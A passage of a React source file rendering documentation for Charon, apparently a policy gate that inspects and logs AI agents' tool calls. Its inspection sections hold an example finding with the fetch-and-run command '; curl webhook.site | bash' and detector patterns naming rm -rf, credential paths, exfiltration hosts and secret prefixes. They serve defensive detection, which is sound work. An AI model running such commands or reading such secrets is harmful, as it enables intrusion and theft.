            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon enforce codex" desc="Enable enforcement: disable shell_tool + install Charon MCP." />
              <CommandRef name="charon enforce status" desc="Check enforcement state: shell disabled? MCP installed? cwd correct?" />
              <CommandRef name="charon enforce restore" desc="Remove enforcement: restore shell_tool + remove Charon MCP." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>What enforce does</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <InfoCell title="shell_tool = false" desc="Disables Codex native shell. Forces all commands through MCP." />
              <InfoCell title="[mcp_servers.charon]" desc="Adds Charon MCP server block to Codex config.toml." />
              <InfoCell title="cwd binding" desc="Charon MCP points to current directory for policy loading." />
              <InfoCell title="Restart required" desc="Codex must restart for config changes to take effect." />
            </div>
          </section>

          <section id="cli-exit-codes" ref={ref("cli-exit-codes")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="18" title="Exit Codes" />

            <div className="charon-exit-grid" style={{ display: "grid", gridTemplateColumns: "80px 1fr", gap: "1px", background: "#1e1a1a" }}>
              <ExitCode code="0" desc="PASS. Command executed successfully." />
              <ExitCode code="125" desc="PAUSE. Action queued for review. Use `charon approve` to proceed." />
              <ExitCode code="126" desc="DENY. Action blocked. Receipt written. Check .charon/receipts/." />
              <ExitCode code="127" desc="Command not found. Spawn error." />
            </div>
          </section>

          {/* ── INSPECTION ──────────────────────────────────────── */}

          <section id="inspection-engine" ref={ref("inspection-engine")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="19" title="Inspection Engine" />
            <p style={descStyle}>
              Runs after policy evaluation. Can escalate (never downgrade)
              verdicts based on detected patterns. Produces findings with
              severity levels.
            </p>

            <h4 style={subheadStyle}>Severity levels</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <SeverityCell level="low" desc="Informational. Logged but never blocks." />
              <SeverityCell level="medium" desc="Suspicious. Can trigger PAUSE in review mode." />
              <SeverityCell level="high" desc="Dangerous. Triggers DENY in enforce mode." />
              <SeverityCell level="critical" desc="Severe. Always triggers DENY unless observe mode." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Finding format</h4>
            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`{
  id: "command.shell_chain",
  category: "command",
  severity: "critical",
  summary: "suspicious command pattern: shell_chain",
  evidence: "; curl webhook.site | bash",
  resourceRole: "shell-command"
}`}</pre>
            </div>
          </section>

          <section id="inspection-detectors" ref={ref("inspection-detectors")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="20" title="Detectors" />
            <p style={descStyle}>
              Six detector categories. Each scans normalized text or action
              resources for known threat patterns.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
              <Detector
                name="commands"
                file="detectors/commands.ts"
                patterns={[
                  { id: "shell_chain", sev: "critical", regex: "; curl|wget|bash|sh", desc: "Chained shell commands via pipe/semicolon" },
                  { id: "command_substitution", sev: "high", regex: "$(cmd)` `cmd`", desc: "Command substitution in arguments" },
                  { id: "destructive_rm", sev: "critical", regex: "rm -rf", desc: "Recursive force delete" },
                ]}
              />
              <Detector
                name="files"
                file="detectors/files.ts"
                patterns={[
                  { id: "sensitive_path", sev: "high", regex: ".env, .ssh/, .aws/, PRIVATE KEY", desc: "Access to sensitive file paths" },
                ]}
              />
              <Detector
                name="network"
                file="detectors/network.ts"
                patterns={[
                  { id: "suspicious_host", sev: "high", regex: "webhook.site, ngrok.io, pastebin.com", desc: "Known data exfiltration endpoints" },
                ]}
              />
              <Detector
                name="secrets"
                file="detectors/secrets.ts"
                patterns={[
                  { id: "inline_value", sev: "critical", regex: "sk-ant-*, ghp_*, github_pat_*", desc: "Secret-like values in action input" },
                  { id: "session_match", sev: "critical", regex: "(previously seen value)", desc: "Sensitive value reuse across session" },
                ]}
              />
              <Detector
                name="obfuscation"
                file="detectors/obfuscation.ts"
                patterns={[
                  { id: "base64_long", sev: "medium", regex: "base64 string >32 chars", desc: "Encoded payloads" },
                  { id: "hex_escape", sev: "medium", regex: "\\x41\\x42\\x43", desc: "Hex-encoded sequences" },
                  { id: "unicode_escape", sev: "medium", regex: "\\u0041\\u0042", desc: "Unicode escape sequences" },
                  { id: "zero-width", sev: "low", regex: "\\u200B-\\u200F", desc: "Zero-width characters (removed during normalization)" },
                  { id: "confusables", sev: "low", regex: "Cyrillic a/e/o/p", desc: "Homoglyph substitution (normalized to ASCII)" },
                ]}
              />
              <Detector
                name="social"
                file="detectors/social.ts"
                patterns={[
                  { id: "urgency", sev: "medium", regex: "urgent, immediately, right now, asap", desc: "Pressure language" },
                  { id: "bypass", sev: "high", regex: "bypass the check/security/guardrail", desc: "Explicit bypass instructions" },
                  { id: "credential_request", sev: "high", regex: "give me/tell me/show me + token/secret", desc: "Credential exfiltration attempts" },
                ]}
              />
            </div>
          </section>

          <section id="inspection-session" ref={ref("inspection-session")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="21" title="Session Memory" />
            <p style={descStyle}>
              InspectionSession tracks sensitive values across tool calls within a
              session. If a secret seen in one call appears in a later call, it
              triggers a critical finding.
            </p>

            <h4 style={subheadStyle}>How it works</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a", marginBottom: "24px" }}>
              <FlowStep num="1" title="REMEMBER" desc="When a secret resource is detected, its value is stored in the session map." />
              <FlowStep num="2" title="MATCH" desc="On subsequent actions, all session values are checked against the new input text." />
              <FlowStep num="3" title="FINDING" desc="If a match is found, a critical secret.session_match finding is produced." />
              <FlowStep num="4" title="PRUNE" desc="Values expire after TTL (default: 5 minutes). Max 512 entries. LRU eviction." />
            </div>

            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`// Session config
DEFAULT_TTL_MS = 5 * 60 * 1000  // 5 minutes
DEFAULT_MAX_ENTRIES = 512

// Normalization
- lowercase
- trim
- minimum 6 chars to store`}</pre>
            </div>
          </section>

          {/* ── RECEIPTS ─────────────────────────────────────────── */}

          <section id="receipts-format" ref={ref("receipts-format")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="22" title="Receipt v2 Format" />
            <p style={descStyle}>
              Every decision writes a signed, tamper-evident receipt. Schema:
              charon.trustedReceipt.v2.
            </p>

            <div
              className="charon-docs-grid"
              style={{
                display: "grid",
                gridTemplateColumns: "1fr 280px",
                border: "1px solid #1e1a1a",
              }}
            >
              <div
                style={{
                  borderRight: "1px solid #1e1a1a",
                }}
              >
                <div style={codeHeaderStyle}>.charon/receipts/req_17.json</div>
                <pre
                  style={{
                    padding: "16px",
                    fontSize: "11px",
                    lineHeight: 1.7,
                    color: "#8a8282",
                    overflowX: "auto",
                    margin: 0,
                  }}
                >{`{
  "schema": "charon.trustedReceipt.v2",
  "id": "req_17",
  "createdAt": "2025-01-15T14:32:12.734Z",
  "action": {
    "id": "req_17",
    "runtime": "cli",
    "toolName": "shell",
    "args": "git push origin feat/new-auth",
    "cwd": "/home/user/project",
    "resources": [{
      "role": "git-remote-url",
      "value": "git@github.com:user/repo.git",
      "canonical": "ssh://git@github.com/user/repo"
    }]
  },
  "decision": {
    "verdict": "PAUSE",
    "reason": "release.git_push matched bounds",
    "ruleId": "release.git_push",
    "resources": [...]
  },
  "policyHash": "03f7a1c2b4d5e6f8...",
  "actionHash": "d8c7b6a5f4e3d2c1...",
  "decisionHash": "a1b2c3d4e5f6...",
  "execution": {
    "launched": false,
    "status": "not_launched"
  },
  "receiptHash": "7a6b5c4d3e2f1a0b...",
  "signature": {
    "schema": "charon.receiptSignature.v1",
    "type": "ed25519",
    "keyId": "ed25519:workspace",
    "signature": "base64-encoded-signature"
  }
}`}</pre>
              </div>
              <div
                style={{
                  padding: "20px",
                  display: "flex",
                  flexDirection: "column",
                  gap: "20px",
                }}
              >
                <ReceiptFeature
                  title="tamper evident"
                  text="SHA-256 hash binds action, decision, and policy into one digest. Any modification invalidates the hash."
                />
                <ReceiptFeature
                  title="signed"
                  text="Workspace Ed25519 key signs the receipt hash. Signature verified on `charon verify`."
                />
                <ReceiptFeature
                  title="local first"
                  text="All receipts stored in .charon/receipts/. No external service. Append-only JSONL audit log."
                />
                <ReceiptFeature
                  title="denied is recorded"
                  text="Blocked actions still leave evidence. Nothing is silent."
                />
              </div>
            </div>
          </section>

          <section id="receipts-signing" ref={ref("receipts-signing")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="23" title="Signing" />
            <p style={descStyle}>
              Receipts are signed with Ed25519 keys. The private key lives in
              .charon/identity.key (mode 0600). The public key is in
              identity.json.
            </p>

            <h4 style={subheadStyle}>Signing flow</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <FlowStep num="1" title="BUILD" desc="Unsigned receipt built from action + decision + policy hash." />
              <FlowStep num="2" title="HASH" desc="SHA-256 of stable-stringified unsigned receipt → receiptHash." />
              <FlowStep num="3" title="SIGN" desc="Ed25519 sign(receiptHash, privateKey) → base64 signature." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Verification flow</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <FlowStep num="1" title="REBUILD" desc="Strip signature + identity from receipt. Rebuild unsigned." />
              <FlowStep num="2" title="HASH CHECK" desc="SHA-256 of rebuilt unsigned must match stored receiptHash." />
              <FlowStep num="3" title="SIG CHECK" desc="verify(receiptHash, signature, publicKey) must return true." />
            </div>
          </section>

          <section id="receipts-redaction" ref={ref("receipts-redaction")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="24" title="Redaction" />
            <p style={descStyle}>
              Secrets are automatically redacted before storage. Patterns matched:
            </p>

            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`// API keys
sk-proj-*      → [REDACTED:openai]
sk-*           → [REDACTED:api-key]
ghp_*, github_pat_* → [REDACTED:github]

// Private keys
-----BEGIN ... PRIVATE KEY----- → [REDACTED:private-key]

// Secret-like object keys
/secret|token|api[_-]?key|password|credential/i
  → value replaced with [REDACTED:secret]`}</pre>
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Resource redaction</h4>
            <p style={descStyle}>
              Resources with role=secret are always replaced with
              [REDACTED:secret]. Other resources have their values run through
              the string redaction patterns above.
            </p>
          </section>

          {/* ── MCP ──────────────────────────────────────────────── */}

          <section id="mcp-proxy" ref={ref("mcp-proxy")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="25" title="Proxy Mode" />
            <p style={descStyle}>
              Wraps any MCP server. All tool calls pass through Charon policy
              before reaching the upstream server.
            </p>

            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`# Wrap a specific MCP server
charon mcp proxy -- npx @modelcontextprotocol/server-github

# Output wrapped config for pasting into config.json
charon mcp config github -- npx @modelcontextprotocol/server-github`}</pre>
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Flow</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <FlowStep num="1" title="TOOL CALL" desc="Agent calls an MCP tool through the proxy." />
              <FlowStep num="2" title="POLICY" desc="Charon evaluates the tool call against charon.yml." />
              <FlowStep num="3" title="GATE" desc="PASS → forward to upstream. PAUSE → queue. DENY → block." />
              <FlowStep num="4" title="RECEIPT" desc="Signed receipt written. Audit log updated." />
            </div>
          </section>

          <section id="mcp-server" ref={ref("mcp-server")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="26" title="Server Mode" />
            <p style={descStyle}>
              Starts a Charon MCP server that exposes policy evaluation as an MCP
              tool. Used by Codex and other MCP-compatible agents.
            </p>

            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`# Start server for current directory
charon mcp server

# Start server for specific directory
charon mcp server --cwd /path/to/project`}</pre>
            </div>
          </section>

          <section id="mcp-guard" ref={ref("mcp-guard")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="27" title="Guard Mode" />
            <p style={descStyle}>
              Rewrites Codex MCP server configs so all tool calls go through
              Charon proxy. Original configs are preserved as comments for
              restoration.
            </p>

            <h4 style={subheadStyle}>Guard operation</h4>
            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`# Before guard
[mcp_servers.github]
command = "npx"
args = ["@modelcontextprotocol/server-github"]

# After guard
[mcp_servers.github]
# charon.guarded = true
# charon.original_command = "npx"
# charon.original_args = ["@modelcontextprotocol/server-github"]
command = "node"
args = ["/path/to/charon.js", "mcp", "proxy", "--", "npx", "@modelcontextprotocol/server-github"]`}</pre>
            </div>
          </section>

          {/* ── ARCHITECTURE ─────────────────────────────────────── */}

          <section id="arch-action" ref={ref("arch-action")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="28" title="Action Layer" />
            <p style={descStyle}>
              The action layer normalizes raw tool calls into typed
              ActionRequest objects with inferred resources.
            </p>

            <h4 style={subheadStyle}>RawToolCall → ActionRequest</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a", marginBottom: "24px" }}>
              <FlowStep num="1" title="INFER" desc="Resource roles inferred from args: paths → read-path/write-path, URLs → fetch-url, secrets → secret." />
              <FlowStep num="2" title="CANONICALIZE" desc="Paths resolved via realpathSync. URLs normalized. Domains extracted. Git remotes parsed." />
              <FlowStep num="3" title="DEDUPE" desc="Duplicate resources (same role + canonical) removed." />
              <FlowStep num="4" title="DEFAULT" desc="If no resources inferred, role=unknown with toolName as value." />
            </div>

            <h4 style={subheadStyle}>Resource inference rules</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <InfoCell title="toolName contains 'shell'" desc="→ resource role: shell-command" />
              <InfoCell title="arg key is 'path', 'file'" desc="→ resource role: read-path" />
              <InfoCell title="arg key is 'dest', 'output'" desc="→ resource role: write-path" />
              <InfoCell title="arg value is URL" desc="→ resource role: fetch-url" />
              <InfoCell title="arg contains 'secret'" desc="→ resource role: secret" />
              <InfoCell title="arg value matches .env" desc="→ resource role: secret" />
            </div>
          </section>

          <section id="arch-roles" ref={ref("arch-roles")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="29" title="Role Registry" />
            <p style={descStyle}>
              Each resource has a role that determines its risk level and
              canonicalization strategy.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <RoleRow role="read-path" risk="medium" desc="Filesystem path read" canonical="realpathSync(cwd + value)" />
              <RoleRow role="write-path" risk="high" desc="Filesystem path written" canonical="realpathSync(cwd + value)" />
              <RoleRow role="delete-path" risk="critical" desc="Filesystem path deleted" canonical="realpathSync(cwd + value)" />
              <RoleRow role="fetch-url" risk="medium" desc="Network URL fetched" canonical="URL normalization + hostname extraction" />
              <RoleRow role="browser-url" risk="medium" desc="Browser navigation" canonical="URL normalization" />
              <RoleRow role="git-remote-url" risk="high" desc="Git remote endpoint" canonical="SCP-like → ssh:// format, strip .git" />
              <RoleRow role="secret" risk="critical" desc="Secret-bearing value" canonical="identity (no transform)" />
              <RoleRow role="shell-command" risk="high" desc="Shell command to execute" canonical="identity (no transform)" />
              <RoleRow role="mcp-tool" risk="medium" desc="MCP tool invocation" canonical="identity (no transform)" />
              <RoleRow role="unknown" risk="medium" desc="Unclassified resource" canonical="identity (no transform)" />
            </div>
          </section>

          <section id="arch-coordinator" ref={ref("arch-coordinator")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="30" title="Coordinator" />
            <p style={descStyle}>
              ActionCoordinator orchestrates the full pipeline: normalize →
              evaluate → inspect → decide → receipt → audit.
            </p>

            <h4 style={subheadStyle}>evaluate() vs enforce()</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <FlowStep num="E" title="EVALUATE" desc="Returns decision + receipt. Does not execute. Used for check-only (dry run)." />
              <FlowStep num="F" title="ENFORCE" desc="Returns decision + receipt + result. Executes if PASS. Used for real gating." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Enforce flow</h4>
            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`1. Normalize input (RawToolCall → ActionRequest)
2. Inspect input (6 detectors → findings)
3. Evaluate policy (rules → decision)
4. Merge inspection (escalate if needed)
5. If verdict ≠ PASS → receipt + return
6. Execute action (if executor provided)
7. Build execution receipt (with status/error)
8. Write audit log entry
9. Return result`}</pre>
            </div>
          </section>

          <section id="arch-audit" ref={ref("arch-audit")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="31" title="Audit Log" />
            <p style={descStyle}>
              Append-only JSONL file. Every evaluate and enforce call writes an
              entry. Used for compliance and debugging.
            </p>

            <h4 style={subheadStyle}>Entry format</h4>
            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`{
  "id": "uuid",
  "time": "ISO-8601",
  "phase": "evaluate | enforce",
  "action": { ... },
  "decision": { ... },
  "receipt": { ... }
}`}</pre>
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Storage</h4>
            <p style={descStyle}>
              Written to .charon/audit.jsonl. Created on first use. Uses
              appendFileSync for atomic appends. Directory auto-created.
            </p>
          </section>

        </main>
      </div>
    </div>
  );
}

// ─── Components ─────────────────────────────────────────────────────────────

function SectionLabel({
  number,
  title,
}: {
  number: string;
  title: string;
}) {
  return (
    <div
      style={{
        display: "flex",
        alignItems: "center",
        gap: "12px",
        marginBottom: "16px",
      }}
    >
      <span
        style={{
          fontSize: "10px",
          color: "#e8a040",
          letterSpacing: "0.1em",
        }}
      >
        {number}
      </span>
      <span
        style={{
          fontSize: "10px",
          textTransform: "uppercase",
          letterSpacing: "0.2em",
          color: "#5a5454",
        }}
      >
        {title}
      </span>
    </div>
  );
}

function CommandBlock({
  label,
  command,
  output,
  verdict,
}: {
  label: string;
  command: string;
  output: string;
  verdict?: string;
}) {
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(command);
      setCopied(true);
      setTimeout(() => setCopied(false), 1400);
    } catch {}
  };

  const verdictColor =
    verdict === "PASS"
      ? "#4a8a5c"
      : verdict === "DENY"
        ? "#a05040"
        : "#c49a74";

  return (
    <div
      style={{
        border: "1px solid #1e1a1a",
        marginBottom: "12px",
      }}
    >
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          padding: "8px 16px",
          borderBottom: "1px solid #1e1a1a",
          fontSize: "10px",
          color: "#5a5454",
          textTransform: "uppercase",
          letterSpacing: "0.12em",
        }}
      >
        <span>{label}</span>
        <button
          onClick={copy}
          style={{
            color: "#5a5454",
            fontSize: "10px",
            textTransform: "uppercase",
            letterSpacing: "0.1em",
            transition: "color 150ms",
          }}
        >
          {copied ? "copied" : "copy"}
        </button>
      </div>
      <div
        style={{
          padding: "12px 16px",
          fontSize: "12px",
          color: "#f0ece4",
        }}
      >
        <span style={{ color: "#5a5454" }}>$ </span>
        {command}
      </div>
      <div
        style={{
          padding: "8px 16px",
          borderTop: "1px solid #1e1a1a",
          fontSize: "11px",
          lineHeight: 1.7,
          color: "#5a5454",
        }}
      >
        {output.split(/\\n|\n/).map((line, i) => (
          <div key={i}>
            {verdict && i === 0 ? (
              <>
                <span style={{ color: "#5a5454" }}>$ </span>
                <span style={{ color: verdictColor, fontWeight: 700 }}>
                  {verdict}
                </span>
                <span style={{ color: "#5a5454" }}>
                  {" "}
                  {line.replace("$ ", "").replace(verdict, "").trim()}
                </span>
              </>
            ) : (
              <span>{line}</span>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function CommandRef({ name, desc }: { name: string; desc: string }) {
  return (
    <div
      className="charon-cmd-ref"
      style={{
        background: "#0f0d0d",
        padding: "14px 16px",
        display: "grid",
        gridTemplateColumns: "260px 1fr",
        gap: "16px",
        alignItems: "baseline",
      }}
    >
      <code style={{ fontSize: "12px", color: "#f0ece4" }}>{name}</code>
      <span style={{ fontSize: "11px", color: "#5a5454" }}>{desc}</span>
    </div>
  );
}

function InfoCell({ title, desc }: { title: string; desc: string }) {
  return (
    <div style={{ background: "#0f0d0d", padding: "16px" }}>
      <div
        style={{
          fontSize: "11px",
          fontWeight: 700,
          marginBottom: "4px",
          fontFamily: "var(--font-mono)",
        }}
      >
        {title}
      </div>
      <div style={{ fontSize: "11px", color: "#5a5454", lineHeight: 1.5 }}>
        {desc}
      </div>
    </div>
  );
}

function InfoCharonCell({ title, desc }: { title: string; desc: string }) {
  return (
    <div style={{ background: "#0f0d0d", padding: "16px" }}>
      <div
        style={{
          fontSize: "11px",
          fontWeight: 700,
          marginBottom: "4px",
          fontFamily: "var(--font-mono)",
        }}
      >
        {title}
      </div>
      <div style={{ fontSize: "11px", color: "#5a5454", lineHeight: 1.5 }}>
        {desc}
      </div>
    </div>
  );
}



function ExitCode({ code, desc }: { code: string; desc: string }) {
  return (
    <div
      style={{
        background: "#0f0d0d",
        padding: "14px 16px",
        display: "grid",
        gridTemplateColumns: "60px 1fr",
        gap: "16px",
        alignItems: "baseline",
      }}
    >
      <code
        style={{
          fontSize: "12px",
          fontWeight: 700,
          color:
            code === "0"
              ? "#4a8a5c"
              : code === "125"
                ? "#c49a74"
                : code === "126"
                  ? "#a05040"
                  : "#8a8282",
        }}
      >
        {code}
      </code>
      <span style={{ fontSize: "11px", color: "#5a5454" }}>{desc}</span>
    </div>
  );
}

function ModeCell({
  mode,
  desc,
}: {
  mode: string;
  desc: string;
}) {
  return (
    <div style={{ background: "#0f0d0d", padding: "16px" }}>
      <div
        style={{
          fontSize: "11px",
          fontWeight: 700,
          marginBottom: "4px",
          color:
            mode === "enforce"
              ? "#a05040"
              : mode === "review"
                ? "#c49a74"
                : "#8a8282",
        }}
      >
        {mode}
      </div>
      <div style={{ fontSize: "11px", color: "#5a5454", lineHeight: 1.5 }}>
        {desc}
      </div>
    </div>
  );
}

function SeverityCell({
  level,
  desc,
}: {
  level: string;
  desc: string;
}) {
  return (
    <div style={{ background: "#0f0d0d", padding: "16px" }}>
      <div
        style={{
          fontSize: "11px",
          fontWeight: 700,
          marginBottom: "4px",
          color:
            level === "critical"
              ? "#a05040"
              : level === "high"
                ? "#e8a040"
                : level === "medium"
                  ? "#c49a74"
                  : "#8a8282",
        }}
      >
        {level}
      </div>
      <div style={{ fontSize: "11px", color: "#5a5454", lineHeight: 1.5 }}>
        {desc}
      </div>
    </div>
  );
}

function Detector({
  name,
  file,
  patterns,
}: {
  name: string;
  file: string;
  patterns: { id: string; sev: string; regex: string; desc: string }[];
}) {
  return (
    <div
      style={{
        border: "1px solid #1e1a1a",
        padding: "20px",
      }}
    >
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          marginBottom: "16px",
        }}
      >
        <span style={{ fontSize: "13px", fontWeight: 700, textTransform: "uppercase" }}>
          {name}
        </span>
        <span style={{ fontSize: "10px", color: "#5a5454" }}>{file}</span>
      </div>
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "1fr 1fr",
          gap: "1px",
          background: "#1e1a1a",
        }}
      >
        {patterns.map((p) => (
          <div key={p.id} style={{ background: "#0f0d0d", padding: "12px" }}>
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: "4px",
              }}
            >
              <span style={{ fontSize: "11px", fontWeight: 700 }}>
                {p.id}
              </span>
              <span
                style={{
                  fontSize: "9px",
                  fontWeight: 700,
                  color:
                    p.sev === "critical"
                      ? "#a05040"
                      : p.sev === "high"
                        ? "#e8a040"
                        : p.sev === "medium"
                          ? "#c49a74"
                          : "#8a8282",
                }}
              >
                {p.sev}
              </span>
            </div>
            <div
              style={{
                fontSize: "10px",
                color: "#5a5454",
                marginBottom: "4px",
                fontFamily: "var(--font-mono)",
              }}
            >
              {p.regex}
            </div>
            <div style={{ fontSize: "10px", color: "#5a5454" }}>
              {p.desc}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function RoleRow({
  role,
  risk,
  desc,
  canonical,
}: {
  role: string;
  risk: string;
  desc: string;
  canonical: string;
}) {
  return (
    <div
      className="charon-role-row"
      style={{
        background: "#0f0d0d",
        padding: "12px 16px",
        display: "grid",
        gridTemplateColumns: "140px 60px 1fr 1fr",
        gap: "16px",
        alignItems: "baseline",
        fontSize: "11px",
      }}
    >
      <code style={{ color: "#f0ece4" }}>{role}</code>
      <span
        style={{
          color:
            risk === "critical"
              ? "#a05040"
              : risk === "high"
                ? "#e8a040"
                : risk === "medium"
                  ? "#c49a74"
                  : "#8a8282",
          fontWeight: 700,
          fontSize: "10px",
        }}
      >
        {risk}
      </span>
      <span style={{ color: "#5a5454" }}>{desc}</span>
      <span style={{ color: "#5a5454", fontFamily: "var(--font-mono)", fontSize: "10px" }}>
        {canonical}
      </span>
    </div>
  );
}

function FlowDiagram() {
  return (
    <div
      style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        gap: "0",
        padding: "12px 0",
      }}
    >
      {[
        { label: "ACTION", sub: "typed command" },
        { label: "POLICY", sub: "charon.yml" },
        { label: "VERDICT", sub: "pass / pause / deny" },
        { label: "RECEIPT", sub: ".charon/receipts/" },
      ].map((step, i) => (
        <div key={step.label} style={{ display: "flex", alignItems: "center" }}>
          <div
            style={{
              textAlign: "center",
              padding: "16px 24px",
              border: "1px solid #1e1a1a",
              background: "rgba(232,160,64,0.04)",
            }}
          >
            <div
              style={{
                fontSize: "11px",
                fontWeight: 700,
                letterSpacing: "0.1em",
                marginBottom: "4px",
              }}
            >
              {step.label}
            </div>
            <div style={{ fontSize: "10px", color: "#5a5454" }}>
              {step.sub}
            </div>
          </div>
          {i < 3 && (
            <div
              style={{ color: "#5a5454", fontSize: "16px", padding: "0 4px" }}
            >
              →
            </div>
          )}
        </div>
      ))}
    </div>
  );
}

function FlowStep({
  num,
  title,
  desc,
}: {
  num: string;
  title: string;
  desc: string;
}) {
  return (
    <div style={{ background: "#0f0d0d", padding: "16px" }}>
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: "8px",
          marginBottom: "6px",
        }}
      >
        <span
          style={{ fontSize: "10px", color: "#e8a040", fontWeight: 700 }}
        >
          {num}
        </span>
        <span
          style={{
            fontSize: "11px",
            fontWeight: 700,
            letterSpacing: "0.08em",
          }}
        >
          {title}
        </span>
      </div>
      <span style={{ fontSize: "11px", color: "#5a5454", lineHeight: 1.6 }}>
        {desc}
      </span>
    </div>
  );
}

function ReceiptFeature({
  title,
  text,
}: {
  title: string;
  text: string;
}) {
  return (
    <div style={{ borderLeft: "2px solid #e8a040", paddingLeft: "12px" }}>
      <div style={{ fontSize: "11px", fontWeight: 700, marginBottom: "4px" }}>
        {title}
      </div>
      <div style={{ fontSize: "11px", color: "#5a5454", lineHeight: 1.5 }}>
        {text}
      </div>
    </div>
  );
}

// ─── Styles ─────────────────────────────────────────────────────────────────

const descStyle: React.CSSProperties = {
  color: "#8a8282",
  fontSize: "13px",
  lineHeight: 1.8,
  marginBottom: "28px",
  maxWidth: "560px",
};

const subheadStyle: React.CSSProperties = {
  fontSize: "11px",
  fontWeight: 700,
  textTransform: "uppercase",
  letterSpacing: "0.12em",
  color: "#8a8282",
  marginBottom: "12px",
};

const codeBlock: React.CSSProperties = {
  border: "1px solid #1e1a1a",
  padding: "16px",
  marginTop: "12px",
};

const codeHeaderStyle: React.CSSProperties = {
  padding: "0 16px 12px",
  fontSize: "10px",
  textTransform: "uppercase",
  letterSpacing: "0.12em",
  color: "#5a5454",
  borderBottom: "1px solid #1e1a1a",
  marginBottom: "4px",
};

const sidebarLabelStyle: React.CSSProperties = {
  fontSize: "10px",
  textTransform: "uppercase",
  letterSpacing: "0.12em",
  color: "#5a5454",
  marginBottom: "8px",
};

const sidebarDivider: React.CSSProperties = {
  borderTop: "1px solid #1e1a1a",
  paddingTop: "16px",
};
